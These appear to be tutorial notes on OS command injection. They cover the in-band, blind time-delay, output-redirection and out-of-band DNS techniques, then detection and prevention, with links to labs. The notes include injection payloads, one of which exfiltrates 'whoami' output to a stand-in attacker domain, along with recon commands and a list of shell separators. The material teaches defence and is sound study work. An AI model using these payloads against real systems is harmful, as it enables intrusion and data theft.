# OS Command Injection

> `Command injection` also `shell injection` is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application.
- An attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, exploiting the trust relationships to pivot the attack to other systems within the organization.
- Command injection attacks are possible when an applicatioon passes unsafer user supplied data (forms, cookies, HTTP headers etc) to a system shell.
- The attacker-supplied operating system commands are usually executed with the priviledges of the vulnerable application.
- Differs from `code injection` because code injection allows the attacker to add their own code that is then executed by the application.

### Executing arbitrary commands
- Consider a shopping application that lets user view whether an item is in stock in a particular store. The info can be accessed via:
```
https://website.com/stockStatus?productID=381&storeID=29
```
- To provide such information the application must query various legacy systems. The functionality is implemented by calling out to a shell command with the product and store IDs as arguments:
``` 
stockreport.pl 381 29
```
- This command outputs the stock status for the specified item which is returned to the user.
- With no defenses against OS command injection, an attacker can submit the following input to execute an arbitrary command:
```
& echo aiwefajs &
```
- If this input is submitted in the **productID** parameter, then the command executed by the application is:
```
stockreport.pl & echo aiwefajs & 29
```
- The `echo` command causes the supplied string to be echoed in the output and is useful to test for some types of OS command injection.
- The `&` character is a shell command separator and what gets executed is actually three separate commands one after another.
- The output returned as a result will be:
```
Error - productID was not provided
aiwefajs
29: command not found
```
- The three lines demonstrate that:
    1. The original `stockreport.pl` command was executed without its expected arguments and so returned an error message.
    2. The injected `echo` command was executed and the supplied string was echoed in the output.
    3. The original argument `29` was executed as a command which caused an error.
        
### Useful commands
- It is useful to execute some initial commands to obtain information about the system that's been compromised.
 ```
        |-------------------------------------------------------------------|
        |   Purpose of command      |   Linux           |   Windows         |
        |---------------------------|-------------------|-------------------|
        |   Name of current user    |   whoami          |   whoami          |
        |   Operating System        |   uname -a        |   ver             |
        |   Network Configuration   |   ifconfig        |   ipconfig /all   |
        |   Network Connections     |   netstat -an     |   netstat -an     |
        |   Running Processes       |   ps -ef          |   tasklist        |
        |-------------------------------------------------------------------|
```

### Blind OS command injection vulnerabilities
- Many instances of OS command injection are blind vulnerabilities ie the application doesn't return the output from the command within its HTTP response.
- Consider a website that lets users submit feedback about the site. The user enters their email address and feedback message. The server-side app then generates an email to a site administrator containing the feedback by calling out the `mail` program with the submitted details. 
```
mail -s "I love this website. Great Job!" -aFrom:james@user.net feedback@website.com
```
- The output from the `mail` command is not returned in the application's responses, and so using the `echo` payload would not be effective hence use a variety of other techniques to detect and exploit a vulnerability.

### Detecting blind OS command injection using time delays.
- One can use an injected command that will trigger a time delay, allowing you to confirm that the command was executed based on the time the application takes to respond.
- The `ping` command is an effective way as it lets you specify the number of ICMP packets to send and the time taken. ie:
```
& ping -c 10 127.0.0.1 &
```

### Exploiting blind OS command injection by redirecting output
- You can redirect the output from the injected command into a file within the web root that you can then retrieve using your browser.
- Eg, if the application serves static resources from the filesystem location `/var/www/static` then one can submit the following input:
```
& whoami > /var/www/static/whoami.txt &
```
- The `>` character sends the output from the `whoami` command to the specified file. 
- You can then use your browser to fetch `https://vulnerablewebsite.com/whoami.txt` to retrieve the file, and view the output from the injected command.

### Exploiting blind OS command injection using out-of-band(OAST) techniques.
- One can use an injected command that will trigger an out-of-band network interaction with a system that you control using OAST techniques such as"
```
& nslookup kgji2ohoyw.web-attacker.com &
```
- This payload uses the `nslookup` command to cause a DNS lookup for the specified domain.
- The attacker can monitor for the specified lookup occurring thereby detect the command was successfully injected.
- The out-of-band channel will also provides an easy way to exfiltrate the output from injected commands:
```
& nslookup 'whoami'.kgji2ohoyw.web-attacker.com &
```
- This will cause a DNS lookup to the attacker's domain containing the result of the `whoami` command:
```
wwwuser.kgji2ohoyw.web-attacker.com
```
- More about OAST can be found on the following [blog](https://portswigger.net/blog/oast-out-of-band-application-security-testing).

### Ways of Injecting OS commands
- A variety of shell metacharacters can be used to perform OS command injection attacks.
- The following command separators work on both Windows and Unix-based systems:
    1. &
    2. &&
    3. |
    4. ||
- The following command separators work only on Unix-based systems:
    1. ;
    2. Newline (0x0a or \n)
- On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:
    1. 'injected command'
    2. $(injected command)
- The different shell metacharacters have subtly different behaviours that might affect whether they work in certain situations and whether they allow in-band retrieval of command output or are useful only for blind exploitation.
- The input that you control appears within quotation marks in the original command, in such a situation, terminate the quoted context using **"** or **'** before using suitable shell metacharacters to inject a new command.

### How to detect OS command injection
- Can be detected in two ways:
    1. Performing source code security review.
        - Also known as `Static Analysis Security Testing`
        1. Check if the deprecated os module is used.
        2. Check if subprocess is used with shell=True
        3. If subprocess needs to be used with shell=True, then check if shlex.quote() is used as a prevention control.
        4. Check if shlex.split() is used as a prevention control.
    2. Performing web application vulnerability scanning.
        - Web application vulnerability scanners can identify OS command injection vulnerability when the application is up and running.
        - This kind of testing is also known as `Dynamix Application Security Testing(DAST)`.

### How to prevent OS command injection attacks.
- The most effective way is to never call out to OS commands from application-layer code.
- If unavoidable to call out to OS commands with user-supplied input then strong input validation must be performed.
- Some of the effective validation include:
    1. Validating against a whitelist of permitted values.
    2. Validating that the input is a number.
    3. Validating that the input contains only alphanumeric characters, no other syntax or whitespace.
        
- Don't attempt to sanitize input by escaping shell metacharacters because it is error-prone and vulnerable to being bypassed.

## codes
[command injector](./command_injector.py)

[command injector preventor](./command_injector_preventor.py) by quoting the input using **shlex.quote()**

[command injector preventor](./command_injector_preventor2.py) by splitting the command into a list of strings using **shlex.split()**

--------------------------------------------------------------------------------
# Materials
## `Referencing`
-   [PortSwigger](https://portswigger.net/web-security/os-command-injection)
-   [OWASP](https://owasp.org/www-community/attacks/Command_Injection)

## `Labs` 
-   [Lab: OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
-   [Lab: Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
-   [Lab: Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
-   [Lab: Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
-   [Lab: Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
